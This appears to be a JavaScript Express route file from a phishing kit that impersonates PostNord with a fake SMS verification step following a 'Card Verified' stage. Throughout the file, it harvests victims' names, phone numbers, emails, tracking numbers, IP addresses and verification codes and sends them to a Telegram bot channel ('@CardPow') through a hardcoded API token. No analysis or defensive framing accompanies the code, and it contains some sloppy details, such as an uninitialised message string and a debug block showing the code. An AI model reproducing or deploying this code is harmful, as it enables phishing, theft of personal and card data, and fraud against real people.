const express = require("express")
const router = express.Router()

// Store sessions (same as main app)
const sessions = new Map()

// Send SMS Code Attempt to Telegram
async function sendSMSAttemptToTelegram(attemptedCode, correctCode, userInfo, isCorrect, req) {
  const status = isCorrect ? "✅ CORRECT" : "❌ INCORRECT"

  let content
  content += `<b>👤 User Details:</b>\n`
  content += `<b>Name</b>: <i>${userInfo.card_holder}</i>\n`
  content += `<b>Phone</b>: <i>${userInfo.phone}</i>\n`
  content += `<b>Tracking</b>: <i>${userInfo.tracking_number}</i>\n\n`
  content += `<b>📅 Attempt Time</b>: <i>${new Date().toISOString()}</i>\n`
  content += `<b>🌐 IP Address</b>: <i>${req.ip || req.connection.remoteAddress || "Unknown"}</i>\n\n`

  if (isCorrect) {
    content += `<b>🎉 VERIFICATION SUCCESSFUL!</b>\n`
    content += `<b>📦 Delivery can proceed</b>\n`
  } else {
    content += `<b>⚠️ Verification failed</b>\n`
    content += `<b>🔄 User may try again</b>\n`
  }

  content += `<b>🟡🔵 PostNord SMS Verification 🔵🟡</b>`

  const apiToken = "7367815376:AAEsgfmON0-TRCs7ejuD96sNQDD2DCA2mmc"
  const url = `https://api.telegram.org/bot${apiToken}/sendMessage`

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: "@CardPow",
        text: content,
        parse_mode: "HTML",
      }),
    })

    return response.ok
  } catch (error) {
    console.error("Error sending SMS attempt to Telegram:", error)
    return false
  }
}

// Send New SMS Code to Telegram
async function sendNewSMSCodeToTelegram(smsCode, userInfo, req) {
  let content = `<b>🔄 PostNord SMS Code - RESENT</b>\n\n`
  content += `<b>🔐 New SMS Code</b>: <code>${smsCode}</code>\n\n`
  content += `<b>👤 User Details:</b>\n`
  content += `<b>Name</b>: <i>${userInfo.card_holder}</i>\n`
  content += `<b>Phone</b>: <i>${userInfo.phone}</i>\n`
  content += `<b>Email</b>: <i>${userInfo.email}</i>\n`
  content += `<b>Tracking</b>: <i>${userInfo.tracking_number}</i>\n\n`
  content += `<b>📅 Resent At</b>: <i>${new Date().toISOString()}</i>\n`
  content += `<b>🌐 IP Address</b>: <i>${req.ip || req.connection.remoteAddress || "Unknown"}</i>\n\n`
  content += `<b>⏰ Code expires in 10 minutes</b>\n`
  content += `<b>🟡🔵 PostNord SMS Resend 🔵🟡</b>`

  const apiToken = "7367815376:AAEsgfmON0-TRCs7ejuD96sNQDD2DCA2mmc"
  const url = `https://api.telegram.org/bot${apiToken}/sendMessage`

  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: "@CardPow",
        text: content,
        parse_mode: "HTML",
      }),
    })

    return response.ok
  } catch (error) {
    console.error("Error sending new SMS code to Telegram:", error)
    return false
  }
}

// Route to display SMS verification page
router.get("/sms_verification", (req, res) => {
  const sessionId = req.cookies.session_id
  const session = sessions.get(sessionId)

  if (!session || !session.sms_code) {
    return res.redirect("/")
  }

  const maxAttempts = 5
  const currentAttempts = session.sms_attempts || 0

  res.send(generateSMSVerificationPage(session, currentAttempts, maxAttempts))
})

// Route to handle SMS verification
router.post("/sms_verification", async (req, res) => {
  const sessionId = req.cookies.session_id
  const session = sessions.get(sessionId)

  if (!session) {
    return res.redirect("/")
  }

  const { sms_code, resend_sms } = req.body
  const maxAttempts = 5

  // Handle resend SMS request
  if (resend_sms) {
    const timeSinceLast = Date.now() - session.sms_sent_time

    if (timeSinceLast >= 60000) {
      // Allow resend after 60 seconds
      // Generate new code
      const newSmsCode = String(Math.floor(Math.random() * 900000) + 100000)
      session.sms_code = newSmsCode
      session.sms_sent_time = Date.now()

      // Send new SMS code to Telegram
      await sendNewSMSCodeToTelegram(newSmsCode, session, req)

      sessions.set(sessionId, session)

      return res.send(
        generateSMSVerificationPage(
          session,
          session.sms_attempts,
          maxAttempts,
          "New SMS code sent to your phone and @CardPow channel.",
        ),
      )
    } else {
      const waitTime = Math.ceil((60000 - timeSinceLast) / 1000)
      return res.send(
        generateSMSVerificationPage(
          session,
          session.sms_attempts,
          maxAttempts,
          null,
          `Please wait ${waitTime} seconds before requesting a new code.`,
        ),
      )
    }
  }

  // Handle SMS code verification
  if (sms_code) {
    const submittedCode = sms_code.replace(/\D/g, "") // Only digits

    session.sms_attempts++
    const isCorrect = submittedCode === session.sms_code

    // Send attempt details to Telegram
    await sendSMSAttemptToTelegram(submittedCode, session.sms_code, session, isCorrect, req)

    if (isCorrect) {
      // Code is correct - redirect to success page
      sessions.set(sessionId, session)
      return res.redirect("/delivery_confirmed")
    } else {
      // Code is incorrect
      if (session.sms_attempts >= maxAttempts) {
        sessions.delete(sessionId)
        res.clearCookie("session_id")
        return res.send(
          generateSMSVerificationPage(
            session,
            session.sms_attempts,
            maxAttempts,
            null,
            "Too many failed attempts. Please start over.",
          ),
        )
      } else {
        sessions.set(sessionId, session)
        return res.send(
          generateSMSVerificationPage(
            session,
            session.sms_attempts,
            maxAttempts,
            null,
            "Invalid SMS code. Please try again.",
          ),
        )
      }
    }
  }
})

// Generate SMS verification page HTML
function generateSMSVerificationPage(
  session,
  currentAttempts,
  maxAttempts,
  successMessage = null,
  errorMessage = null,
) {
  return `
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>PostNord - SMS Verification</title>
        <link rel="stylesheet" href="/styles.css">
    </head>
    <body>
        <div class="header">
            <div class="container">
                <div class="logo">
                    <div class="logo-icon">📦</div>
                    <div class="logo-text">
                        <span class="post">Post</span><span class="nord">Nord</span>
                    </div>
                </div>
                <div class="header-info">
                    <span>SMS Verification Required</span>
                </div>
            </div>
        </div>

        <div class="main-container">
            <div class="sms-verification-container">
                <div class="sms-form">
                    <div class="verification-header">
                        <div class="verification-icon">📱</div>
                        <h2>SMS Verification</h2>
                        <p>We've sent a 6-digit verification code to:</p>
                        <div class="phone-display">${session.phone}</div>
                    </div>

                    <div class="delivery-steps">
                        <div class="step completed">
                            <div class="step-number">✓</div>
                            <span>Card Verified</span>
                        </div>
                        <div class="step active">
                            <div class="step-number">2</div>
                            <span>SMS Verification</span>
                        </div>
                        <div class="step">
                            <div class="step-number">3</div>
                            <span>Delivery Confirmed</span>
                        </div>
                    </div>

                    ${
                      errorMessage
                        ? `
                        <div class="error-alert">
                            ⚠️ ${errorMessage}
                        </div>
                    `
                        : ""
                    }

                    ${
                      successMessage
                        ? `
                        <div class="success-message">
                            ✅ ${successMessage}
                        </div>
                    `
                        : ""
                    }

                    <form action="/sms_verification" method="POST" id="smsForm">
                        <div class="sms-input-group">
                            <label for="smsCode">Enter 6-digit verification code</label>
                            <div class="sms-input-container">
                                <input type="text" id="smsCode" name="sms_code" maxlength="6" placeholder="000000" required autocomplete="one-time-code">
                                <div class="input-indicator" id="inputIndicator"></div>
                            </div>
                            <div class="attempts-counter">
                                Attempts: ${currentAttempts}/${maxAttempts}
                            </div>
                        </div>

                        <button type="submit" class="verify-btn" id="verifyBtn">
                            <span class="btn-icon">🔐</span>
                            Verify SMS Code
                        </button>
                    </form>

                    <div class="resend-section">
                        <p>Didn't receive the code?</p>
                        <form action="/sms_verification" method="POST" style="display: inline;">
                            <button type="submit" name="resend_sms" value="1" class="resend-btn" id="resendBtn">
                                📲 Resend SMS Code
                            </button>
                        </form>
                    </div>

                    <div class="security-info">
                        <div class="info-item">
                            <span class="info-icon">🔒</span>
                            <div class="info-content">
                                <strong>Secure Verification</strong>
                                <small>This code expires in 10 minutes</small>
                            </div>
                        </div>
                        <div class="info-item">
                            <span class="info-icon">📱</span>
                            <div class="info-content">
                                <strong>Telegram Monitoring</strong>
                                <small>All attempts sent to @CardPow</small>
                            </div>
                        </div>
                    </div>

                    <!-- Debug info (remove in production) -->
                    <div class="debug-info">
                        <strong>🔧 Debug Info (Remove in production):</strong><br>
                        SMS Code: <span style="color: #0052cc; font-weight: bold;">${session.sms_code}</span><br>
                        <small>This code is also sent to @CardPow channel</small>
                    </div>
                </div>
            </div>
        </div>

        <div class="footer">
            <div class="container">
                <p>&copy; 2024 PostNord. Secure delivery verification system.</p>
                <div class="footer-links">
                    <a href="#">Privacy Policy</a>
                    <a href="#">Terms of Service</a>
                    <a href="#">Contact Support</a>
                </div>
            </div>
        </div>

        <script>
            document.addEventListener("DOMContentLoaded", () => {
                const smsForm = document.getElementById("smsForm");
                const smsCodeInput = document.getElementById("smsCode");
                const verifyBtn = document.getElementById("verifyBtn");
                const inputIndicator = document.getElementById("inputIndicator");

                // Auto-format SMS code input (digits only)
                smsCodeInput.addEventListener("input", (e) => {
                    let value = e.target.value.replace(/\\D/g, "");
                    if (value.length > 6) {
                        value = value.substring(0, 6);
                    }
                    e.target.value = value;
                    updateInputIndicator(value.length);

                    if (value.length === 6) {
                        setTimeout(() => {
                            smsForm.submit();
                        }, 500);
                    }
                });

                function updateInputIndicator(length) {
                    const indicators = [];
                    for (let i = 0; i < 6; i++) {
                        indicators.push(i < length ? "●" : "○");
                    }
                    inputIndicator.textContent = indicators.join(" ");
                }

                updateInputIndicator(0);
                smsCodeInput.focus();

                smsForm.addEventListener("submit", (e) => {
                    const code = smsCodeInput.value.trim();
                    if (code.length !== 6) {
                        e.preventDefault();
                        return;
                    }
                    verifyBtn.innerHTML = '<span class="btn-icon">⏳</span> Verifying...';
                    verifyBtn.disabled = true;
                });
            });
        </script>
    </body>
    </html>
    `
}

module.exports = { router, sessions }
